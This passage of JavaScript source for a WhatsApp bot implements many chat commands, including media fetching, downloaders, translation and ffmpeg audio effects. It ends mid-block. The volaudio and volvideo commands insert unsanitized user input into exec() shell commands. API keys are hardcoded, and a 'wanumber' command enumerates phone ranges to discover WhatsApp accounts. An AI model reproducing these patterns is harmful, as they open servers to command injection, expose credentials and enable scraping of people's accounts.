if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')

        let yeha = heyy[Math.floor(Math.random() * heyy.length)];

        // Prepare and send the image with caption
        const caption = `Hi ${m.pushName} 👋\n_*Here is the result of: ${command}*_`;
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: yeha },
            caption: caption,
        }, { quoted: m });

    } catch (error) {
        console.error('Error in wallhp command:', error.message);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later. 😓');
    }
}
break;


		case 'translate': {
    if (!q) return replygcxlicon(`*❓ Where is the text?*\n\n📌 *Example usage:*\n*${prefix + command} <language id> <text>*\n*${prefix + command} ja yo wassup*`);
        await XliconStickWait()    

    const defaultLang = 'en';
    let lang = args[0];
    let text = args.slice(1).join(' ');

    if ((args[0] || '').length !== 2) {
        lang = defaultLang;
        text = args.join(' ');
    }

    if (!text && m.quoted && m.quoted.text) text = m.quoted.text;

    try {
        let result = await translate(text, { to: lang, autoCorrect: true }).catch(_ => null);
        if (!result || !result.text) return replygcxlicon('⚠️ Translation failed. Please try again.');

        const caption = `🌐 *Translated Text:* ${result.text}\n\n*🔤 From:* ${text}\n*🔠 To:* ${lang}`;
        const imageUrl = 'https://i.ibb.co/qCTXK9p/ES-TEAMS-V1.jpg';

        // Send the message with the image URL directly
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: imageUrl },
            caption: caption,
            mentions: [m.sender]
        }, { quoted: m });

    } catch (e) {
        console.error('Error in translation:', e);
        replygcxlicon('⚠️ An error occurred. Please try again later.');
    }
}
break;


    case 'coffee': case 'kopi': {
    await XliconStickWait()    
    try {
        // Get a random coffee image
        const imageUrl = 'https://coffee.alexflipnote.dev/random';
        const imageBuffer = await axios.get(imageUrl, { responseType: 'arraybuffer' }).then(res => Buffer.from(res.data));

        // Create the message content with emojis
        const caption = `☕ Hi ${m.pushName}!\n_*Here is the result of: ${command}*_`;

        // Send the message with the coffee image
        await XliconBotInc.sendMessage(m.chat, {
            image: imageBuffer,
            caption: caption,
            mentions: [m.sender]
        });

    } catch (e) {
        console.error('Error:', e);
        return replygcxlicon('❗ *Error:* Something went wrong! ⚠️');
    }
}
break;

            case 'wallpaper': {
    if (!text) return replygcxlicon('Enter Query Title');

    await XliconStickWait();
    let { wallpaper } = require('./lib/scraper');
    anuwallpep = await wallpaper(text);
    let result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)];

    const reply = `Hi ${m.pushName}\n_*Here is the result of ${text}*_\n\n`
        + `🌟 *Title:* ${result.title}\n`
        + `📁 *Category:* ${result.type}\n`
        + `📄 *Detail:* ${result.source}\n`
        + `🔗 *Media URL:* ${result.image[2] || result.image[1] || result.image[0]}`;

    await XliconBotInc.sendMessage(m.chat, {
        image: { url: result.image[0] },
        caption: reply,
        mentions: [m.sender]
    });
}
break;

            case 'wikimedia': {
    if (!text) return replygcxlicon('Enter Query Title');

    await XliconStickWait();
    let { wikimedia } = require('./lib/scraper');
    let anumedia = await wikimedia(text);
    let result = anumedia[Math.floor(Math.random() * anumedia.length)];

    // Formatting the reply message
    const replyMessage = `Hi ${m.pushName}\n\n`
        + `🔎 *Title:* ${result.title}\n`
        + `🌐 *Source:* ${result.source}\n`
        + `📸 *Media URL:* ${result.image}`;

    // Sending the response directly with image and text
    await XliconBotInc.sendMessage(m.chat, {
        image: { url: result.image },
        caption: replyMessage,
        mentions: [m.sender]
    });

}
break;

    case 'aesthetic': {
    await XliconStickWait();
    var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/aesthetic.json'));
    var hasil = pickRandom(notnot);

    // Formatting the reply message with emojis
    const replyMessage = `🌟 Hi ${m.pushName} 🌟\n\n`
        + `✨ *Here is the result of: ${command}* ✨\n\n`
        + `🖼️ *Image URL:* ${hasil.url}\n`
        + `💡 *Enjoy the aesthetic!*`;

    // Sending the image and caption directly
    await XliconBotInc.sendMessage(m.chat, {
        image: { url: hasil.url },
        caption: replyMessage,
        mentions: [m.sender]
    });

}
break;

			case 'ebinary': {
if (!q) return replygcxlicon(`Send/reply text with captions ${prefix + command}`)
await XliconStickWait()                
let { eBinary } = require('./lib/binary')
let eb = await eBinary(`${q}`)
replygcxlicon(eb)
}
break
        
case 'dbinary': {
if (!q) return replygcxlicon(`Send/reply text with captions ${prefix + command}`)
await XliconStickWait()    
let { dBinary } = require('./lib/binary')
let db = await dBinary(`${q}`)
replygcxlicon(db)
}
break
        
			  case 'volaudio': {
if (!args.join(" ")) return replygcxlicon(`Example: ${prefix + command} 10`)
await XliconStickWait()                  
media = await XliconBotInc.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcxlicon('Error!')
jadie = fs.readFileSync(rname)
XliconBotInc.sendMessage(m.chat, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
        
case 'volvideo': {
if (!args.join(" ")) return replygcxlicon(`Example: ${prefix + command} 10`)
await XliconStickWait()    
media = await XliconBotInc.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcxlicon('Error!')
jadie = fs.readFileSync(rname)
XliconBotInc.sendMessage(m.chat, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
        
			case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replygcxlicon(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replygcxlicon(`Example : ${prefix + command} 😅+🤔`)
                await XliconStickWait()
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await XliconBotInc.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                }
            }
            break
        
			case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                await XliconStickWait()
                let media = await XliconBotInc.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return replygcxlicon(err)
                let buff = fs.readFileSync(ran)
                XliconBotInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else replygcxlicon(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                replygcxlicon(e)
                }
                break
        
			case 'toonce':
            case 'toviewonce': {
                if (!m.quoted) return replygcxlicon(`Reply Image/Video`)
                await XliconStickWait()
                if (/image/.test(mime)) {
                    anuan = await XliconBotInc.downloadAndSaveMediaMessage(quoted)
                    XliconBotInc.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: mess.done,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await XliconBotInc.downloadAndSaveMediaMessage(quoted)
                    XliconBotInc.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: mess.done,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/audio/.test(mime)) {
                   bebasap = await XliconBotInc.downloadAndSaveMediaMessage(quoted)
                   XliconBotInc.sendMessage(m.chat, {
                     audio: {
                        url: bebasap
                     },
                     mimetype: 'audio/mpeg',
                     ptt: true,
                     viewOnce: true
                   })
                }
            }
        
            break
        
        
			case 'fliptext': {
                if (args.length < 1) return replygcxlicon(`Example:\n${prefix}fliptext dgxlicon`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replygcxlicon(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
        
			case 'style': case 'styletext': {
		if (!text) return replygcxlicon('Enter Query text!')
                let anu = await styletext(text)
                let teks = `Style Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
                }
                replygcxlicon(teks)
	    }
	    break
        
			case 'obfus': case 'obfuscate':{
if (!text) return replygcxlicon(`Example ${prefix+command} const xliconbot = require('baileys')`)
await XliconStickWait()                
try {
let meg = await obfus(text)
replygcxlicon(`Success
${meg.result}`)
} catch {
	replygcxlicon(`Use the command properly\nExample ${prefix+command} const xliconbot = require('baileys')`)
}
}
break
        
        
			case 'autodownload': case 'autodl': {
    if (!XliconTheCreator) return XliconStickOwner();
await XliconStickWait()
    if (q == 'on') {
        db.settings[botNumber].autodownload = true;
        return replygcxlicon(`Successfully changed Auto Download to ${q} ✅`);
    } else if (q == 'off') {
        db.settings[botNumber].autodownload = false;
        return replygcxlicon(`Successfully changed Auto Download to ${q} ❌`);
    } else {
       
        const replyMessage = `Hi ${m.pushName},\n\nPlease choose to *${command}*:\n\n`
            + `✅ *Enable Auto Download*\n❌ *Disable Auto Download*`;

        return replygcxlicon(replyMessage);
    }
}
break;

			case 'weather':{
if (!text) return replygcxlicon('What location?')
await XliconStickWait()                
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = "";
            textw += `🌍 *Weather Report for ${text}*\n\n`;
            textw += `🌤️ *Weather:* ${wdata.data.weather[0].main}\n`;
            textw += `🌥️ *Description:* ${wdata.data.weather[0].description}\n`;
            textw += `🌡️ *Avg Temp:* ${wdata.data.main.temp}°C\n`;
            textw += `🤗 *Feels Like:* ${wdata.data.main.feels_like}°C\n`;
            textw += `🌬️ *Pressure:* ${wdata.data.main.pressure} hPa\n`;
            textw += `💧 *Humidity:* ${wdata.data.main.humidity}%\n`;
            textw += `🍃 *Wind Speed:* ${wdata.data.wind.speed} m/s\n`;
            textw += `🗺️ *Latitude:* ${wdata.data.coord.lat}\n`;
            textw += `🗺️ *Longitude:* ${wdata.data.coord.lon}\n`;
            textw += `🏳️ *Country:* ${wdata.data.sys.country}\n`;
            
           XliconBotInc.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
        
        
           case 'happymod':{
if (!q) return replygcxlicon(`Example ${prefix+command} Sufway surfer mod`)
await XliconStickWait()
let kat = await scp2.happymod(q)
replygcxlicon(util.format(kat))
}
break
        
        
case 'gdrive': {
  if (!args[0]) return replygcxlicon(`❌ *Please provide a Google Drive link!*`);

  await XliconStickWait();

  const fg = require('api-dylux');
  try {
    // Fetch Google Drive file details using the API
    const apiUrl = `${global.api}downloader/gdrive?apikey=${global.id}&url=${encodeURIComponent(args[0])}`;
    let res = await fetch(apiUrl);
    let apiResponse = await res.json();

    if (apiResponse.status !== 200 || !apiResponse.result) {
      return replygcxlicon('❌ *Failed to fetch data from Google Drive link.* Please check the URL and try again.');
    }

    // Extract file details from API response
    const { fileName, fileSize, mimetype, downloadUrl } = apiResponse.result;

    // Determine the type of file and send accordingly
    if (mimetype.includes('image')) {
      // Send as an image
      await XliconBotInc.sendMessage(m.chat, {
        image: { url: downloadUrl },
        caption: `🖼 *Image Name:* ${fileName}\n🗂 *Size:* ${fileSize}\n📥 *Download Link:* ${downloadUrl}`
      });
    } else if (mimetype.includes('video')) {
      // Send as a video
      await XliconBotInc.sendMessage(m.chat, {
        video: { url: downloadUrl },
        caption: `🎬 *Video Name:* ${fileName}\n🗂 *Size:* ${fileSize}\n📥 *Download Link:* ${downloadUrl}`
      });
    } else if (mimetype.includes('application')) {
      // Send as a document (for file types like PDF, DOC, etc.)
      await XliconBotInc.sendMessage(m.chat, {
        document: { url: downloadUrl },
        fileName: fileName,
        mimetype: mimetype,
        caption: `📄 *File Name:* ${fileName}\n🗂 *Size:* ${fileSize}\n📥 *Download Link:* ${downloadUrl}`
      });
    } else {
      // Default for other file types (this could be further customized)
      await XliconBotInc.sendMessage(m.chat, {
        document: { url: downloadUrl },
        fileName: fileName,
        mimetype: mimetype,
        caption: `📂 *File Name:* ${fileName}\n🗂 *Size:* ${fileSize}\n📥 *Download Link:* ${downloadUrl}`
      });
    }
  } catch (error) {
    console.error('Error fetching Google Drive data:', error.message);
    return replygcxlicon('❌ *An error occurred while processing the link. Please check the URL and try again.*');
  }
}
break;
        
        
           case 'git': case 'gitclone':
if (!args[0]) return replygcxlicon(`Where is the link?\nExample :\n${prefix}${command} https://github.com/paskito002/ES_TEAMS-MEDIA`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcxlicon(`Link invalid!!`)
await XliconStickWait()        
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    XliconBotInc.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcxlicon(mess.error))
break
        

case 'spotify': {
  if (!text) return replygcxlicon(`*Where is the Song Name?*\n_Example :_\n${prefix}${command} Metamorphosis`)
await XliconStickWait()
  try {
    // Fetch Spotify search results
    let api = await fetchJson(`https://api.junn4.my.id/search/spotify?query=${text}`);
    
    if (!api.data || api.data.length === 0) {
      await XliconBotInc.sendMessage(m.chat, '❌ No results found on Spotify. Please try again with a different query.', { quoted: m });
      return;
    }

    // Prepare the response message with song information
    const songInfo = `*🎶 S P O T I F Y - D L 🎶*

• 🎵 *Title*: ${api.data[0].title}
• ⏱️ *Duration*: ${api.data[0].duration}
• ⭐ *Popularity*: ${api.data[0].popularity}
• 🔗 *Url*: ${api.data[0].url}`;

    // Send the song info to the user
    await XliconBotInc.sendMessage(m.chat, { text: songInfo }, { quoted: m });

    // Fetch the Spotify song download link
    let spodl = await fetchJson(`https://api.junn4.my.id/download/spotify?url=${api.data[0].url}`);
    const spoDl = spodl.data.download;

    // Send the Spotify song as an audio message with additional context (external ad reply)
    await XliconBotInc.sendMessage(m.chat, {
      audio: { url: spoDl },
      mimetype: 'audio/mpeg',
      contextInfo: {
        externalAdReply: {
          title: `🎵 - sᴘᴏᴛɪғʏ -`,
          body: api.data[0].title,
          thumbnailUrl: spodl.data.image, // Use the song's album image as thumbnail
          sourceUrl: global.sourceurl || spodl.data.url, // URL to the source (you can customize this)
          mediaType: 2,
          showAdAttribution: true,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m });

  } catch (error) {
    console.error('Error fetching Spotify data:', error);
    await XliconBotInc.sendMessage(m.chat, { text: '❌ An error occurred while fetching the Spotify data. Please try again later.' }, { quoted: m });
  }
}
break;
        				

case 'soundcloud': {
  if (!text) return replygcxlicon(`*Where is the Song Name?*\n_Example:_\n${prefix}${command} Metamorphosis`);
await XliconStickWait()
  try {
    // Fetch SoundCloud search results using your API
    const apiUrl = `${global.api}downloader/sound-cloud?apikey=${global.id}&url=${encodeURIComponent(text)}`;
    let api = await fetchJson(apiUrl);

    // Log the API response for debugging
    console.log('SoundCloud API Response:', api);

    if (!api || api.status !== 200 || !api.result) {
      console.error('API response is invalid or no results found:', api);
      await XliconBotInc.sendMessage(m.chat, '❌ No results found on SoundCloud. Please try again with a different query.', { quoted: m });
      return;
    }

    // Prepare the response message with song information
    const songInfo = `*🎵 S O U N D C L O U D 🎵*\n\n` +
                     `• 🎵 *Title*: ${api.result.title}\n` +
                     `• ⏱️ *Duration*: ${api.result.duration}\n` +
                     `• 🎵 *Quality*: ${api.result.quality}\n` +
                     `• 🔗 *Download Link*: [Click Here](${api.result.dl_url})`;

    // Send the song info to the user
    await XliconBotInc.sendMessage(m.chat, { text: songInfo }, { quoted: m });

    // Check if the download URL exists and is valid
    const downloadUrl = api.result.dl_url;
    if (!downloadUrl || !downloadUrl.startsWith('https://')) {
      console.error('Invalid download URL:', downloadUrl);
      await XliconBotInc.sendMessage(m.chat, '❌ No download link found or URL is invalid. Please try again.', { quoted: m });
      return;
    }

    // Log the download URL for debugging
    console.log('Download URL:', downloadUrl);

    // Fetch the audio file
    const audioResponse = await fetch(downloadUrl);
    if (!audioResponse.ok) {
      throw new Error(`Failed to fetch audio. Status: ${audioResponse.status}`);
    }

    const audioBuffer = await audioResponse.buffer();
    if (!audioBuffer || audioBuffer.length === 0) {
      await XliconBotInc.sendMessage(m.chat, '❌ Failed to fetch audio. The file might be empty or inaccessible.', { quoted: m });
      return;
    }

    // Send the SoundCloud song as an audio message with additional context (external ad reply)
    await XliconBotInc.sendMessage(m.chat, {
      audio: { buffer: audioBuffer },
      mimetype: 'audio/mpeg',
      contextInfo: {
        externalAdReply: {
          title: `🎵 - sᴏᴜɴᴅᴄʟᴏᴜᴅ -`,
          body: api.result.title,
          thumbnailUrl: api.result.thumb, // Use the song's thumbnail image
          sourceUrl: downloadUrl, // URL to the download link
          mediaType: 2,
          showAdAttribution: true,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m });

  } catch (error) {
    console.error('Error fetching SoundCloud data:', error.message);
    await XliconBotInc.sendMessage(m.chat, { text: '❌ An error occurred while fetching the SoundCloud data. Please try again later.' }, { quoted: m });
  }
}
break;
        

	case 'mediafire': {
  if (!args[0]) return replygcxlicon(`Enter the MediaFire link next to the command`);
  if (!args[0].match(/mediafire/gi)) return replygcxlicon(`Link incorrect`);
await XliconStickWait()
  const { mediafiredl } = require('@bochilteam/scraper');
  let full = /f$/i.test(command);
  let u = /https?:\/\//.test(args[0]) ? args[0] : 'https://' + args[0];

  // Notify the user that the download is starting
  replygcxlicon(`⏳ *Downloading file, please wait...*`);

  try {
    let res = await mediafiredl(args[0]);
    let { url, url2, filename, ext, aploud, filesize, filesizeH } = res;
    
    let caption = `
   ≡ *MEDIAFIRE*

  ▢ *Filename:* ${filename}
  ▢ *Size:* ${filesizeH}
  ▢ *Extension:* ${ext}
  ▢ *Uploaded:* ${aploud}
  `.trim();

    // Send the file to the chat
    await XliconBotInc.sendMessage(m.chat, { document: { url: url }, fileName: filename, mimetype: ext }, { quoted: m });
    
    // Notify the user that the download is complete
    return replygcxlicon(`✅ *Download complete!* 🎉\n\n${caption}`);
  } catch (error) {
    console.error(`Error during MediaFire download: ${error.message}`);
    return replygcxlicon(`❌ *Failed to download the file. Please try again later.*`);
  }
}
break;
             
   
case 'mediafire2': {
  if (!args[0]) return replygcxlicon(`🚫 *Please provide a MediaFire link next to the command!*`);
  if (!args[0].match(/mediafire/gi)) return replygcxlicon(`❌ *Invalid link! Please provide a valid MediaFire link.*`);

  await XliconStickWait();

  // Construct the API URL
  const apiUrl = `https://bk9.fun/download/mediafire?url=${encodeURIComponent(args[0])}`;

  try {
    // Notify the user that the process is starting
    replygcxlicon(`⏳ *Fetching file details, please wait...*`);

    // Fetch the API response
    const res = await fetch(apiUrl);
    const api_response = await res.json();

    // Check if the response is valid
    if (api_response.status && api_response.BK9) {
      const { link, alternativeUrl, name, mime, uploaded, size } = api_response.BK9;

      // Test the primary link
      const primaryLinkResponse = await fetch(link);
      let finalLink = link;

      // If the primary link fails, use the alternative link
      if (!primaryLinkResponse.ok) {
        console.warn('Primary link failed, switching to alternative link.');
        const alternativeLinkResponse = await fetch(alternativeUrl);
        if (alternativeLinkResponse.ok) {
          finalLink = alternativeUrl;
        } else {
          throw new Error('Both primary and alternative links failed.');
        }
      }

      const caption = `
📂 *MEDIAFIRE FILE DETAILS*
  
📄 *Filename:* ${name}
📏 *Size:* ${size}
📂 *Extension:* ${mime}
📅 *Uploaded On:* ${uploaded}
      `.trim();

      // Send the file
      await XliconBotInc.sendMessage(m.chat, {
        document: { url: finalLink },
        fileName: name,
        mimetype: `application/${mime.toLowerCase()}`,
      }, { quoted: m });

      // Notify the user that the download is complete
      return replygcxlicon(`✅ *Download Complete!* 🎉\n\n${caption}`);
    }

    // Handle cases where the response does not contain the expected data
    return replygcxlicon(`❌ *Failed to fetch the file details. Please check the link or try again later.*`);

  } catch (error) {
    console.error('Error fetching MediaFire data:', error.message);
    return replygcxlicon(`⚠️ *An error occurred while processing your request. Please try again later.*`);
  }
}
break;
              
                
       

			case 'remini': {
  if (!quoted) return replygcxlicon(`Where is the picture? 📸`);
    if (!/image/.test(mime)) return replygcxlicon(`Send/Reply Photos With Captions ${prefix + command}`);

    await XliconStickWait();
    const { remini } = require('./lib/remini');
    let media = await quoted.download();
    let proses = await remini(media, "enhance");

    const replyMessage = `Hi ${m.pushName},\n_*Here is the result of: ${command}*_\n\n` +
                         `📸 *Enhanced Image*`;

    // Send the enhanced image
    await XliconBotInc.sendMessage(m.chat, {
        image: proses,
        caption: replyMessage,
        mentions: [m.sender]
    });
}
break;
    
			case 'imdb':
if (!text) return replygcxlicon(`_Name a Series or movie`)
await XliconStickWait()
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           XliconBotInc.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
        
        
     case 'itunes': {
  if (!text) return replygcxlicon('Please provide a song name 🎶');
await XliconStickWait()
  try {
    let res = await fetch(`https://api.popcat.xyz/itunes?q=${encodeURIComponent(text)}`);
    if (!res.ok) {
      throw new Error(`API request failed with status ${res.status}`);
    }
    let json = await res.json();
    console.log('JSON response:', json);

    let songInfo = 
    `*Song Information* 🎵\n
• *Name:* ${json.name}\n
• *Artist:* ${json.artist}\n
• *Album:* ${json.album}\n
• *Release Date:* ${json.release_date}\n
• *Price:* ${json.price} 💲\n
• *Length:* ${json.length} ⏳\n
• *Genre:* ${json.genre}\n
• *URL:* ${json.url}`;

    // Check if thumbnail is present, then send it with songInfo as caption
    if (json.thumbnail) {
      let imageMessage = await prepareWAMessageMedia({ image: { url: json.thumbnail } }, { upload: XliconBotInc.waUploadToServer });
      await XliconBotInc.sendMessage(m.chat, { image: { url: json.thumbnail }, caption: songInfo }, { quoted: m });
    } else {
      replygcxlicon(songInfo);
    }
  } catch (error) {
    console.error(error);
    replygcxlicon('An error occurred while fetching the song details 😞');
  }
}
break;

            case 'lyrics': {
  if (!text) return replygcxlicon(`What lyrics are you looking for? 🎶\nExample usage: ${prefix}lyrics Thunder`);

  await XliconStickWait();
  const { lyrics, lyricsv2 } = require('@bochilteam/scraper');

  try {
    const result = await lyricsv2(text).catch(async () => await lyrics(text));
    const xliconlirik = `
🎵 *Title:* ${result.title}
🎤 *Author:* ${result.author}
🔗 *URL:* ${result.link}

📝 *Lyrics:*
${result.lyrics}
`.trim();

    // If there is an image URL in the result, we can send the lyrics with the image
    if (result.thumbnail) {
      await XliconBotInc.sendMessage(m.chat, { image: { url: result.thumbnail }, caption: xliconlirik }, { quoted: m });
    } else {
      replygcxlicon(xliconlirik);
    }
  } catch (error) {
    console.error(error);
    replygcxlicon(`Lyrics for "${text}" not found! 😞`);
  }
}
break;

            case 'friend':
case 'searchfriend':{
await XliconStickWait()
let teman = pickRandom(xliconverifieduser)
setTimeout(() => {
}, 1000)
setTimeout(() => {
replygcxlicon('Managed to Get One Person')
}, 5000)
setTimeout(() => {
XliconBotInc.sendMessage(m.chat, {text: `Here @${teman.split("@")[0]}`, mentions: [teman]}, { quoted : m })
}, 9000)
}
break
        
case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber': {
  if (!text) return replygcxlicon(`📱 Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`);

  var inputnumber = text.split(" ")[0];
  await XliconStickWait();
  replygcxlicon(`🔍 Searching for WhatsApp account in the given range...`);

  function countInstances(string, word) {
      return string.split(word).length - 1;
  }

  var number0 = inputnumber.split('x')[0];
  var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : '';
  var random_length = countInstances(inputnumber, 'x');
  var randomxx;

  if (random_length == 1) {
      randomxx = 10;
  } else if (random_length == 2) {
      randomxx = 100;
  } else if (random_length == 3) {
      randomxx = 1000;
  }

  var text66 = `*==[ List of WhatsApp Numbers ]==*\n\n`;
  var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.📲\n`;
  var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*❌\n`;

  for (let i = 0; i < randomxx; i++) {
      var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9'];
      var status1 = nu[Math.floor(Math.random() * nu.length)];
      var status2 = nu[Math.floor(Math.random() * nu.length)];
      var status3 = nu[Math.floor(Math.random() * nu.length)];
      var dom4 = nu[Math.floor(Math.random() * nu.length)];
      var random21;

      if (random_length == 1) {
          random21 = `${status1}`;
      } else if (random_length == 2) {
          random21 = `${status1}${status2}`;
      } else if (random_length == 3) {
          random21 = `${status1}${status2}${status3}`;
      } else if (random_length == 4) {
          random21 = `${status1}${status2}${status3}${dom4}`;
      }

      var anu = await XliconBotInc.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`);
      var anuu = anu.length !== 0 ? anu : false;

      try {
          try {
